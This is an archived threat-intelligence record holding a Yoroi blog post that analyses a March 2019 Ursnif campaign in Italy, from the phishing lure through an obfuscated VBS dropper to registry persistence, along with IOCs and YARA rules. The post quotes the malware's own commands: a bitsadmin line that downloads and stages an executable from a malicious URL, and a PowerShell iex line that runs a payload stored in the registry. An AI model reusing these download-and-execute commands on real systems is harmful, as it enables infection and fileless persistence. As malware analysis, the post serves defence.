{
    "id": "2f6407d8-c3fb-4d02-8a8c-2de3c1580cba",
    "created_at": "2023-01-12T15:01:32.514942Z",
    "updated_at": "2025-03-27T02:05:29.498252Z",
    "deleted_at": null,
    "sha1_hash": "d47ab590cb4c589a398a5ce8bfee2277dbeeede4",
    "title": "2019-03-26 - The Ursnif Gangs keep Threatening Italy",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:16Z",
    "file_modification_date": "2022-05-28T15:43:16Z",
    "file_size": 537279,
    "plain_text": "# The Ursnif Gangs keep Threatening Italy\n\n**[blog.yoroi.company/research/the-ursnif-gangs-keep-threatening-italy/](https://blog.yoroi.company/research/the-ursnif-gangs-keep-threatening-italy/)**\n\n03/26/2019\n\n## Introduction\n\n\nMarch 26, 2019\n\n\nThe Ursnif trojan confirms itself as one of the most active malware threats in cyberspace, even during\nthe past days, when new attack attempts reached several organization across Italy. Cybaze-Yoroi\nZLab teams dissected its infection chain to keep tracking the evolution of this persistent malware\nthreat, analyzing its multiple stages, each one with the purpose to evade detection, sometimes\nleveraging system tools to achieve its final objective: run the Ursnif payload.\n\nFigure 1: Infection chain of Ursnif malware\n\n## Technical Analysis\n\nUnlike previous waves, this one does not leverage steganography or heavily obfuscated powershell\npayloads. Instead, it abuses a VB script hidden into a compressed archive embedded within an\ninnocent looking email referencing a summon. When users click on “Decreto” hyperlink, they are\nredirected to a Google Drive web page which opens a fake page where a fake document is shown and\nit invites them to click on a download link\n\nFigure 2: Drive document “Scarica il documento”\nOnce clicked on the “Scarica il documento” link into the Drive document, an archive is downloaded on\nthe victim machine from blogger[.]scentasticyoga[.]com, embedding two different files: the first is an\nobfuscated Visual Basic Script (VBS) and the second one is a legit image placed there to deceive the\nvictim.\n\nFigure 3: File contained in the Zip file\n\nThe VBS code is obfuscated to evade antivirus detection and, in order to confuse the analyst, all the\nvalues are manipulated in different steps: using many mathematical operations, very long random\nvariable names and other content encoded in Base64 format. The malicious routine is split in many\nslices and then recombined at runtime, quite basic but it is effective evasion technique. After a first deobfuscation phase, a more readable code could be obtained.\n\n\n-----\n\nFigure 4: Malicious VBS, obfuscated (left) and de-obfuscated (right)\nIn the end, the infection starts and the malware runs cmd.exe to download the “eyTWUDW.exe”\nthrough the Bitsadmin utility, and store it into \"%APPDATA%\\Local\\Temp\".\n\n“C:\\Windows\\System32\\cmd.exe” /c bitsadmin /transfer msd5 /priority foreground\n[http://blog.practicereiki.com/pagpoftrh54.php C:\\Users\\admin\\AppData\\Local\\Temp/eyTWUDW.exe](http://blog.practicereiki.com/pagpoftrh54.php)\n\nThe Bitsadmin utility is legit Microsoft command line tool typically used by sysadmins to download\nsystem updates, but during the last years it has also been abused by cyber criminals to masquerade\nmalicious network activities. In this case it has been leveraged to manage the download of the next\ncomponent of the infection chain from “hxxp://blog[.practicereiki[.com/pagpoftrh54[.php”.\n\nAfter that, the loader runs “schtasks” to enable the execution of the “eyTWUDW.exe” payload\ntemporary stored in “%APPDATA%\\Local\\Temp”, and then downloads the next malware stage from\n\nhttp[://link[.kunstsignal[.net/images/W534K5hp8zGWYvpMJkayjGf/FqWxvwp_2F/1_2BEPHtH1r_2FpG5\n/o0BuA8sr5LGg /IDwj8Q6mCoq/5nK9XEb3WoD5wW/y8lJVn5t5QXZMUgDQopzF\n/oO58ImaZl53M5X3E/whzGq3GIOtuCnK6/o3R_2BwMMv/wAo5qeqZ/a[.avi\n\nThrough the mentioned URL, it was possible to intercept the downloaded encrypted payload, subsequentially digested by the “eyTWUDW.exe“ process which, after an internal decryption phase,\nstores it into a registry key, establishing a file-less persistence on the target machine.\n\nFigure 5: Registry key set by malware\nMoreover, the malware contacts another time the C2 to confirm the successful infection, sending a\ncheck-in HTTP request containing parameters used to identify the malware implant:\n\n**Parameter** **Value** **Description**\n\nsoft 3 Major release\n\nversion 214071 Malware software version\n\nuser b2861874feedbf530d08c77a9d5833de User id of the infected machine\n\nserver 12 Server ID\n\n\n-----\n\nid 822 Synthetic id of infected machine\n\ncrc 1 checksum\n\nuptime 235 Time of infection start\n\nTable 1: Ursnif infection format\n\nInvestigating the remote destination where the C2 is hosted, it results active since 05 March 2019, just\na few times before the attack wave; destination unknown to many AV Vendors at time of attack,\nsuggesting this portion of the infrastructure has been specifically prepared for the Italian landscape.\n\nAt this point, “eyTWUDW.exe” runs the previously stored script through the following command,\ninvoking Powershell code from the registry sub-key “amxrters”.\n\npowershell iex([System.Text.Encoding]::ASCII.GetString((Get-ItemProperty\n'HKCU:\\Software\\AppDataLow\\Software\\Microsoft\\94502524-E302-E68A-0D08C77A91BCEB4E').amxrters))\n\nThe content of this additional script is obfuscated with layers of Base-64 encoding, arrays of integers\nand char-code to byte conversions. Dissecting the script we obtained a more readable code:\n\nFigure 6: Script extracted from registry key (left Obfuscated, right Deobfuscated)\nThe first part contains dependencies loaded by the malware to interact with the OS, such as the\nclassic “kernel32” and, more interestingly, one of the last called functions reveal the usage of the same\nAPC injection techniques observed in previous attack waves to inject the payload into the\n“Explorer.exe“ process (rif. “QueueUserAPC” in “Dissecting the Latest Ursnif DHL themed\nCampaign”). The de-obfuscation of the central part of the script reveals the classical string “This\n_program cannot be run in DOS mode”, part of the header of the final stage of the malware will be_\ninjected into the Explorer process.\n\nFigure 7: Ursnif final payload extracted from script\n\n\n-----\n\nAfter noticing the payload is very similar to another Ursnif sample yet analyzed in Ursnif Long Live the\nSteganography”, we proceeded with a differential analysis to spot eventual variations between the\nsamples.\n\nFigure 8: Diff. analysis between already analyzed sample (1)\nAt first look, there are many common parts between the samples, for instance both files are compiled\nin 64 bit mode and the value in the PE sections are closely similar. However, the compilation time\nwere different: while the older is the 28th January, the newer one is 11 March, almost a week after the\ncomparison on the internet of the command and control server host 46.8.18[.186 (CONTEL-NET-3\nRU).\n\nFigure 9: Diff. analysis between already analyzed sample (2)\n\n## Conclusion\n\nUrsnif confirms itself as one of the most active and aggressive malware threats spreading both\nworldwide and within the Italian cyber-landscape. Threat actors behind these attacks constantly\nupdate and vary their infection chains to avoid security controls and evade antivirus detection, luring\nusers with context sounding email messages being opened by thousands of victims each attack wave.\nA serious threat for the security of users data and company assets.\n\n## Indicator of Compromise\n\nDropurl:\n\nhxxps://drive[.]google[.]com/file/d/12F5NTHrUvJyCrHGwdxcB8VemGVbNHxk-/view?\nusp=sharing/\nhxxp://blogger[.]scentasticyoga[.]com\nComponents:\n\n_Atto_51648651519816651651651651651.vbs_\n_eyTWUDW.exe_\nC2:\n\nhttp[://link[.kunstsignal[.net/images/\nHash:\n\na60864bfaaf6d8465a44d1cfceb38001d3de5466bef4c993e51d0f7a4e28776d\n343423080d891e9c05053b8e9854f63d7e9cb8ee79add7341511a0d274a42047\n26300dd94a2cb0b0472d94cceabb8586ba51ef850125fe8c81f88345274c5d2e\n\n### Yara Rules\n\n\n-----\n\n```\nrule Ursnif_201903 {\nmeta:\n     description = \"Yara rule for Ursnif loader - March 2019 version\"\n     author = \"Yoroi - ZLab\"\n     last_updated = \"2019-03-22\"\n     tlp = \"white\"\n     category = \"informational\"\nstrings:\n     $a1 = { 83 02 00 30 83 02 00 4C 83 02 00 68 }\n     $a2 = { FF 83 C4 18 EB 19 FF 75 1C 8D }\n     $a3 = { 32 A8 D7 0E D9 85 B5 E7 67 F3 0F 53 }\ncondition:\n     all of them\n }\nrule Ursnif_201903_regkey_payload {\nmeta:\n     description = \"Yara rule for Ursnif registry key payload - March 2019 version\"\n     author = \"Yoroi - ZLab\"\n     last_updated = \"2019-03-22\"\n     tlp = \"white\"\n     category = \"informational\"\nstrings:\n     $a1 = \"53,45,9f,22,96,b4,20,01,7f,45\"\n     $a2 = \"17,a9,ef,0e,48,a5,1c,24,a2,47,16,76\"\ncondition:\n     all of them\n }\n\n```\nThis blog post was authored by Luigi Martire, Davide Testa and Luca Mella of Cybaze-Yoroi Z-LAB\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-26 - The Ursnif Gangs keep Threatening Italy.pdf"
    ],
    "report_names": [
        "2019-03-26 - The Ursnif Gangs keep Threatening Italy.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535692,
    "ts_updated_at": 1743041129,
    "ts_creation_date": 1653752596,
    "ts_modification_date": 1653752596,
    "files": {
        "pdf": "https://archive.orkl.eu/d47ab590cb4c589a398a5ce8bfee2277dbeeede4.pdf",
        "text": "https://archive.orkl.eu/d47ab590cb4c589a398a5ce8bfee2277dbeeede4.txt",
        "img": "https://archive.orkl.eu/d47ab590cb4c589a398a5ce8bfee2277dbeeede4.jpg"
    }
}